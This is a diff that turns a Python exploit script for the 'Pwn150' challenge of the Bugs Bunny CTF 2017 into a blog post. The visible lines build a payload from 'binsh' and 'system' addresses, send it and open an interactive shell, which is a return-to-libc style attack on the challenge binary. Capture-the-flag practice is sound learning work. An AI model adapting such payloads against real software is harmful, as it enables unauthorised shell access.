@@ -1,3 +1,12 @@
+---
+layout: post
+title: Pwn150
+category: Bugs Bunny CTF 2017
+---
+
+
+```
+
 #!/usr/bin/env python
 #TnMch
 
@@ -19,3 +28,4 @@ payload += binsh
 payload += system
 p.sendline(payload)
 p.interactive()
+```
